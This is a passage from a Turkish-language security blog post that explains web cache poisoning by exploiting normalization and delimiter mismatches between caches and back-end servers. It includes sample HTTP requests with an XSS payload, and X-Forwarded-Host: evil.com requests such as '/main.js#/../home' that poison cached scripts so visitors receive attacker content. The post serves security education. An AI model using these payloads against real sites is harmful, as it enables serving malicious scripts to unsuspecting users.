Bu durumu kötüye kullanmak için önbellek mekanizmasında normalize etme ve sunucu tarafında da delimiter karakterini dikkate alma durumunda aşağıdaki gibi bir istek gönderilebilir. 

```jsx
GET /<Dynamic_Resource><Delimiter><Encoded_Dot_Segment><Static_File>
```

![image.png]({{ site.url }}/blog/img/web-cache-poisoning-icin-kurallari-esnetmek/image%208.png){:class="responsive img-zoomable"}

Bu sayede önbellek, sunucundan gelen */myAccount* yanıtını */robot.txt* dizinini ziyaret edenlere sunuyor olacak.

# Web Cache Poisoning

Normalde web cache poisoning açığında, hedefteki kullanıcını ilgili spesifik url adresini ziyaret etmesi gerekir. Örneğin */home_paramatere=xss* gibi bir adresi ziyaret etmesi gerekir. Bu da zafiyetin etkisini düşüren bir durum. Bunun yerine path confusion ve cache poisoning açıklarını birleştirerek yaygın ziyaret edilen ana sayfa gibi standart sayfaların dahi zehirlenmesini sağlamak mümkün olabilir. 

## Key Normalization

Bir URL'yi normalize etmek genellikle istenen kaynağın mutlak yolunu elde etmeye yardımcı olan güvenli bir eylem olarak kabul edilir. Ancak, bir önbellek anahtarındaki nokta bölümlerini ve kodlamaları çözümlemek, eğer kaynak sunucu yolu aynı şekilde yorumlamıyorsa, saldırganın rastgele kaynakları zehirlemesine olanak tanıyabilir.

Aşağıdaki saldırıların tümü, önbellek anahtarını oluşturmadan önce URL'nin normalleştirildiğini varsayar. Bu, çoğu CDN'de yapılandırılabilir ve Microsoft Azure ve Imperva'da varsayılan bir davranıştır.

### Haritalama Farklılıklarından Yararlanma

Sunucuya ulaşan istek ile sunucu hangi kaynağa erişilmek istendiğini anlamak için mapping denilen haritalama yöntemi ile kaynağın tespitini sağlar.

Hedefteki sunucu özel bir mapping yönetimi kullanmadığında ve yanıtı üretmeden önce path adresini normalize etmediğinde, önbelleğe depolanacak verileri kontrol etmek mümkün olabilir. Bunun klasik bir örneği, var olmayan bir endpoint ziyaret edildiğinde self-reflected XSS'ye sahip olan uygulamalardır.

Aşağıdaki gibi bir istek ve yanıt olduğunu düşünelim:

```jsx
GET /<script>X</script> HTTP/1.1
Host: server.com
```

```jsx
HTTP/1.1 404 Not Found
Content-Type: text/html
Cache-Control: public

Not Found /<script>X</script>
```

Görüldüğü gibi kötü amaçlı xss yükü URL’nin bir parçası ve önbelleğe alınıp yanıt olarak döndürülüyor. Fakat hedefteki kullanıcı bu spesifik URL adresini ziyaret etmediği sürece bu saldırı işe yaramaz.

Fakat eğer, cache key normalize edilirse, aşağıdaki veri, */home* gibi çok ziyaret edilen bir endpoint'i kötü niyetli yanıtla zehirler:

```jsx
GET /<Backend_Path><Path_Traversal><Poisoned_Path>
```

![image.png]({{ site.url }}/blog/img/web-cache-poisoning-icin-kurallari-esnetmek/image%209.png){:class="responsive img-zoomable"}

## Back-end delimiter karakterlerinin kötüye kullanımı

Bir karakter hedef sunucu üzerinde delimiter olarak kullanılırken cache mekanizması üzerinde kullanılmıyorsa, önbelleğe alınabilir kaynak için isteğe bağlı bir anahtar oluşturmak mümkün olabilir.

Burada `$` delimiter karakteri, back-end(hedef sunucunun) in `/../` çözümlemesini durduracaktır.

```jsx
GET /<Backend_Path><Delimiter><Path_Traversal><Poisoned_Path>
```

![image.png]({{ site.url }}/blog/img/web-cache-poisoning-icin-kurallari-esnetmek/image%2010.png){:class="responsive img-zoomable"}

## Front-end delimiter karakterlerinin kötüye kullanımı

Web Cache Deception saldırılarında parsing tutarsızlığına, delimiter karakterinin önbellekte değil yalnızca hedef sunucuda kullanılması neden olur. Tarayıcı aracılığıyla gönderilebilecek, önbellek sunucusu için özel anlamı olan bir karakter bulmak zordur. Ancak web cache poisoning kullanıcı etkileşimi gerektirmediğinden hash `#` gibi delimiter karakterler yol karışıklığına neden olabilir. Girdideki bölümler HTTP server, CDN ve backend frameworkleri üzerinde farklı şekilde ele alındığı için aşağıdaki gibi bir tablo ortaya çıkıyor:

![image.png]({{ site.url }}/blog/img/web-cache-poisoning-icin-kurallari-esnetmek/image%2011.png){:class="responsive img-zoomable"}

Bu nedenle, path normalizasyonu yapan ve hash `#` karakterini delimiter olarak ele alan Microsoft Azure gibi ortamlarda, depolanan kaynağın önbellek anahtarını değiştirmek için bunu kullanmak mümkündür:

```jsx
GET /<Poisoned_Path><Front-End_Delimiter><Path_Traversal><Backend_Path>
```

Bu teknik, önbellek tarafından kullanılan herhangi bir sınırlayıcıya uygulanabilir. Tek gereksinim, anahtarın normalleştirilmesi ve sınırlayıcıdan sonraki son ek ile yolun iletilmesidir.

![image.png]({{ site.url }}/blog/img/web-cache-poisoning-icin-kurallari-esnetmek/image%2013.png){:class="responsive img-zoomable"}

# Olası Gerçek Dünya Örnekleri

Örneğin X-Forwarded-Host başlığındaki adresin websitesindeki yönlendirme üzerinde etkili olduğu bir durumu varsaylım:

```jsx
GET /home HTTP/1.1
Host: server.com
X-Forwarded-Host: evil.com
```

```jsx
HTTP/1.1 302 Found
Location: http://evil.com/index.html
```

Görüldüğü gibi istenilen yönlendirme yapılabilyor fakat bu önbelleğe alınmadığı için diğer kullanıcıların bu isteği yapmasını sağlayamazsınız. Çünkü standart web tarayıcıları üzerinden kullanıcıların XFF başlığını girmesini bekleyemezsiniz. Fakat eğer cache key ile backend tarafındaki parser üzerinde şimdiye kadar ele aldığımız gibi bir uyumsuzluk varsa bu isteğin önbelleğe alınmasını sağlamak mümkün olabilir.

Örneğin eğer ilgili websitesi ana sayfasında *main.js* isimli bir script dosyasını yüklüyorsa, bu dosya konumunu zehirleyerek ana sayfa üzerinde istediğimiz script kodunu çalıştırabiliiriz.

Bunun için aşağıdaki gibi bir istek gönderebiliriz:

```jsx
GET /main.js#/../home HTTP/1.1
Host: server.com
X-Forwarded-Host: evil.com
```

Bu isteği alan cache mekanizması `#` delimiter karakteri dolayısıyla yalnızca **main.js** kısmını önbelleğe alacak. Sunucu ise kendisine iletilen bu istekteki path traversal karakteri dolayısıyla /home dizininin içeriğini önbellek sunucusuna yanıt olarak dönecek. Ve aşağıdaki gibi bir yanıt ortaya çıkacak:

```jsx
HTTP/1.1 302 Found
Location: http://evil.com/home.html
```

Bu sayede aslında kullanıcı ana sayfayı ziyaret ettiğinde önbellekten *main.js* dosyası çağırılarak bizim zehirlemiş olduğumuz önbellek dolayısıyla evil.com adresindeki içerik çekilecek. Bu aşamada dilediğimiz javascript kodunu çalıştırmamız mümkün.

![image.png]({{ site.url }}/blog/img/web-cache-poisoning-icin-kurallari-esnetmek/image%2013.png){:class="responsive img-zoomable"}

Ayrıca aşağıdaki gibi yönlendirme yapılan bir diğer senaryoda:

```jsx
GET /redirect?somePage HTTP/1.1
Host: vulnerable.com
X-Forwarded-Host: evil.com
```

```jsx
HTTP/1.1 302 Found
Location: http://evil.com/somePage
Cache-Control: public, max-age=3600
```

Herhangi bir statik uzantılı dizini zehirlememize gerek kalmadan benzer metot ile isteğimiz dizinden, istediğimiz herhangi bir dizini zehirlememiz de mümkün olabilir.

![image.png]({{ site.url }}/blog/img/web-cache-poisoning-icin-kurallari-esnetmek/image%2014.png){:class="responsive img-zoomable"}


# Kaynakça ve İleri Okuma

- [Gotta cache 'em all: bending the rules of web cache exploitation](https://portswigger.net/research/gotta-cache-em-all#extensions)
